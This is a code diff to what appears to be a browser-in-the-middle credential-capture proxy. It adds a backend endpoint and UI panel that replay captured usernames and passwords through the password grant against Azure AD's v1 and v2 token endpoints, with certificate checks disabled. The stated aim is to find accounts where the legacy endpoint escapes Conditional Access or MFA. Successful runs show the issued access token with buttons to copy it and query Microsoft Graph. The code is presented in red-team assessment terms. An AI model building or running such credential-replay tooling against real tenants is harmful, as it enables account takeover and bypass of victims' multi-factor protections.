@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.29.2")
+app = FastAPI(title="BITM Proxy Debug", version="1.30.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -1368,18 +1368,16 @@ async def api_test_ropc(body: dict):
     return await _ropc_grant(username, password, tenant, client_id, scope)
 
 
-async def _ropc_grant(username: str, password: str, tenant: str,
-                      client_id: str, scope: str) -> dict:
-    """Shared ROPC (grant_type=password) call used by /api/test-ropc and
-    /api/create-ado-pat. Returns the same structured shape both consumers
-    expect: on success {ok:True, access_token, ...}; on a blocked grant
-    {ok:False, aadsts_code, error, error_description} so callers can surface
-    the AADSTS code as the finding rather than a generic failure."""
+async def _do_token_post(url: str, data: dict, username: str, tenant: str,
+                         label: str = "TOKEN") -> dict:
+    """Core password-grant POST + response parse, shared by the v2 ROPC path
+    (_ropc_grant) and the v1+v2 /api/test-token comparison. Returns the
+    structured shape all consumers expect: on success {ok:True, access_token,
+    url, ...}; on a blocked grant {ok:False, aadsts_code, url, error,
+    error_description} so callers can surface the AADSTS code as the finding.
+    `label` prefixes the audit log line (ROPC_SUCCESS / TOKEN_V1_BLOCKED …)."""
     import re
     import httpx
-    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
-    data = {"grant_type": "password", "client_id": client_id,
-            "username": username, "password": password, "scope": scope}
     try:
         async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
             resp = await client.post(url, data=data,
@@ -1393,8 +1391,8 @@ async def _ropc_grant(username: str, password: str, tenant: str,
 
     if resp.status_code == 200 and resp_body.get("access_token"):
         append_log("info", "auth_proxy",
-                   f"ROPC_SUCCESS user={username} tenant={tenant} client_id={client_id}")
-        return {"ok": True, "status_code": resp.status_code,
+                   f"{label}_SUCCESS user={username} tenant={tenant}")
+        return {"ok": True, "status_code": resp.status_code, "url": url,
                 "access_token": resp_body.get("access_token"),
                 "token_type": resp_body.get("token_type"),
                 "expires_in": resp_body.get("expires_in"),
@@ -1403,12 +1401,61 @@ async def _ropc_grant(username: str, password: str, tenant: str,
     err_desc = resp_body.get("error_description", "") or str(resp_body.get("raw", ""))
     m = re.search(r"AADSTS\d+", err_desc)
     append_log("warn", "auth_proxy",
-               f"ROPC_BLOCKED user={username} tenant={tenant} "
+               f"{label}_BLOCKED user={username} tenant={tenant} "
                f"error={resp_body.get('error')} {m.group(0) if m else ''}")
-    return {"ok": False, "status_code": resp.status_code,
+    return {"ok": False, "status_code": resp.status_code, "url": url,
             "error": resp_body.get("error"),
             "error_description": err_desc,
             "aadsts_code": m.group(0) if m else ""}
+
+
+async def _ropc_grant(username: str, password: str, tenant: str,
+                      client_id: str, scope: str) -> dict:
+    """v2 ROPC (grant_type=password → /oauth2/v2.0/token) used by
+    /api/test-ropc and /api/create-ado-pat."""
+    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+    data = {"grant_type": "password", "client_id": client_id,
+            "username": username, "password": password, "scope": scope}
+    return await _do_token_post(url, data, username, tenant, label="ROPC")
+
+
+@app.post("/api/test-token")
+async def api_test_token(body: dict):
+    """Fire the captured creds at BOTH token endpoints via grant_type=password
+    and return the two results side by side:
+      v1  → https://login.microsoftonline.com/<tenant>/oauth2/token   (resource=)
+      v2  → https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token (scope=)
+    The v1/v2 split matters because the legacy v1 endpoint is frequently left
+    with looser (or no) Conditional Access coverage than v2 — comparing the two
+    AADSTS outcomes for the same account shows exactly where that gap is.
+    Body: {username, password, tenant_id?, client_id?, resource?, scope?}.
+    Same gate as ROPC/Graph (enable_token_testing); both calls create Azure AD
+    sign-in log entries (legacy/non-interactive grant — distinctly flagged)."""
+    from backend.shared import get_config_value as _gcv
+    if not _gcv("enable_token_testing", True):
+        return {"error": "Token testing disabled (enable_token_testing=false). "
+                "This creates Azure AD sign-in log entries. Enable in Configuration."}
+    username = (body.get("username") or "").strip()
+    password = body.get("password") or ""
+    if not username or not password:
+        return {"error": "username and password required"}
+    # Same "organizations" default + rationale as /api/test-ropc: common/
+    # consumers reject the password grant outright (AADSTS9001023).
+    tenant = (body.get("tenant_id") or "organizations").strip()
+    client_id = (body.get("client_id") or "29d9ed98-a469-4536-ade2-f981bc1d605e").strip()
+    # v1 speaks resource=, v2 speaks scope=.
+    resource = (body.get("resource") or "https://graph.microsoft.com").strip()
+    scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
+    import asyncio
+    base = f"https://login.microsoftonline.com/{tenant}"
+    v1_data = {"grant_type": "password", "client_id": client_id,
+               "username": username, "password": password, "resource": resource}
+    v2_data = {"grant_type": "password", "client_id": client_id,
+               "username": username, "password": password, "scope": scope}
+    v1, v2 = await asyncio.gather(
+        _do_token_post(f"{base}/oauth2/token", v1_data, username, tenant, label="TOKEN_V1"),
+        _do_token_post(f"{base}/oauth2/v2.0/token", v2_data, username, tenant, label="TOKEN_V2"))
+    return {"v1": v1, "v2": v2}
 
 
 # Azure DevOps first-party resource (app) ID — the audience an AAD token
@@ -7067,6 +7114,38 @@ function renderAaaTokenSnippet(d,siteId){
 // failure is itself the finding (e.g. AADSTS50076 = CA/MFA actually
 // blocked the legacy grant — policy working; a 200 on an MFA-required
 // account means ROPC is an uncovered bypass path).
+function renderTokenPanel(d,siteId){
+  const {guessUser,guessPass}=guessUserPass(d);
+  const tid=(configCache.default_tenant_id||'').trim();
+  return `<div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+      <button class="btn" style="padding:2px 10px;font-size:12px;background:#132a4a;border-color:#2563eb;color:#bfdbfe"
+              onclick="tokenToggle('${siteId}')"
+              title="POST username+password to BOTH /oauth2/token (v1, resource=) and /oauth2/v2.0/token (v2, scope=) and compare the two CA outcomes">Test /token (v1 + v2)…</button>
+    </div>
+    <div id="tok-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #1e3a5f">
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
+        <input id="tok-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
+        <input id="tok-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
+        <input id="tok-tid-${siteId}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain — NOT common/consumers" title="Confirmed live: common/consumers reject the password grant outright with AADSTS9001023">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px;margin-left:6px">Client ID</label>
+        <input id="tok-cid-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="29d9ed98-a469-4536-ade2-f981bc1d605e" title="Microsoft Authentication Broker — well-known public client, no app registration needed">
+        <button class="btn" style="padding:3px 12px;font-size:13px;background:#132a4a;border-color:#2563eb;color:#bfdbfe" onclick="tokenRun('${siteId}')">▶ Run both</button>
+      </div>
+      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
+        grant_type=password against both <code>/oauth2/token</code> (v1, resource=https://graph.microsoft.com) and <code>/oauth2/v2.0/token</code> (v2, scope=…/.default). The legacy v1 endpoint is frequently left with looser Conditional Access than v2 — compare the two AADSTS outcomes for the same account. Creates Azure AD sign-in log entries (legacy/non-interactive grant).
+      </div>
+      <div id="tok-result-${siteId}" style="font-size:13px"></div>
+    </div>
+  </div>`;
+}
 function renderRopcPanel(d,siteId){
   const {guessUser,guessPass}=guessUserPass(d);
   const tid=(configCache.default_tenant_id||'').trim();
@@ -7343,6 +7422,7 @@ function renderCreds(){
           <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" placeholder="Custom test URL (optional)" value="">
         </div>
         <div id="test-result-${site.id}" style="margin-top:6px;margin-bottom:8px;display:none"></div>
+        ${renderTokenPanel(d,site.id)}
         ${renderRopcPanel(d,site.id)}
         ${renderAdoPatPanel(d,site.id)}
         <div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
@@ -7914,6 +7994,54 @@ async function aaaLoginRun(siteId){
     // Refresh sitesCache so the new token shows up in the AAA runner's
     // Token dropdown without a manual reload.
     send({cmd:'get_sites'});
+  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
+}
+function tokenToggle(siteId){
+  const p=document.getElementById('tok-'+siteId);
+  if(!p)return;
+  p.style.display=p.style.display==='none'?'':'none';
+  if(p.style.display!=='none'){
+    document.getElementById('tok-pass-'+siteId)?.focus();
+  }
+}
+function _tokenLegHtml(label,r){
+  if(!r){return `<div style="flex:1;min-width:240px;background:#0f0a0a;padding:8px;border-radius:4px;border:1px solid #3f1d1d"><div style="color:#cbd5e1;font-size:12px">${label}</div><div style="color:#f87171;margin-top:4px">no result</div></div>`}
+  const url=r.url||'';
+  const head=`<div style="color:#cbd5e1;font-size:12px;margin-bottom:2px">${label}</div><code style="color:#78859b;font-size:10px;word-break:break-all">${esc(url)}</code>`;
+  if(r.error&&!r.aadsts_code&&!r.ok){
+    return `<div style="flex:1;min-width:240px;background:#0f0a0a;padding:8px;border-radius:4px;border:1px solid #3f1d1d">${head}<div style="color:#f87171;margin-top:4px">${esc(r.error)}</div></div>`;
+  }
+  if(!r.ok){
+    return `<div style="flex:1;min-width:240px;background:#0f0d06;padding:8px;border-radius:4px;border:1px solid #78530f">${head}
+      <div style="color:#fbbf24;margin-top:4px">✗ ${esc(r.aadsts_code||r.error||'blocked')} — CA blocked (expected/good)</div>
+      <div style="color:#94a3b8;font-size:11px;margin-top:2px">${esc((r.error_description||'').slice(0,220))}</div></div>`;
+  }
+  const tok=r.access_token||'';
+  return `<div style="flex:1;min-width:240px;background:#0a0f0a;padding:8px;border-radius:4px;border:1px solid #7f1d1d">${head}
+    <div style="color:#f87171;font-weight:600;margin-top:4px">⚠ succeeded — NOT blocked by CA</div>
+    <div style="color:#4ade80;font-size:12px">✓ token (${tok.length} b, exp ${r.expires_in||'?'}s)</div>
+    <div style="display:flex;gap:6px;align-items:center;margin-top:4px">
+      <code style="color:#cbd5e1;font-size:10px;flex:1;background:#020617;padding:3px 6px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(tok.slice(0,60))}…</code>
+      <button class="btn" style="padding:1px 8px;font-size:11px;background:#1e3a5f" data-tok="${esc(tok)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button>
+      <button class="btn" style="padding:1px 8px;font-size:11px;background:#065f46" data-tok="${esc(tok)}" onclick="testGraphDirect(this.dataset.tok,this)">Graph</button>
+    </div></div>`;
+}
+async function tokenRun(siteId){
+  const user=(document.getElementById('tok-user-'+siteId)?.value||'').trim();
+  const pass=document.getElementById('tok-pass-'+siteId)?.value||'';
+  const tid=(document.getElementById('tok-tid-'+siteId)?.value||'').trim()||'organizations';
+  const cid=(document.getElementById('tok-cid-'+siteId)?.value||'').trim();
+  const out=document.getElementById('tok-result-'+siteId);
+  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
+  out.innerHTML='<div style="color:#94a3b8">Requesting tokens from v1 + v2 (grant_type=password)…</div>';
+  try{
+    const r=await apiFetch('/api/test-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass,tenant_id:tid,client_id:cid})});
+    const d=await r.json();
+    if(d.error&&!d.v1&&!d.v2){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
+    out.innerHTML=`<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:stretch">
+      ${_tokenLegHtml('v1 · /oauth2/token',d.v1)}
+      ${_tokenLegHtml('v2 · /oauth2/v2.0/token',d.v2)}
+    </div>`;
   }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
 }
 function ropcToggle(siteId){
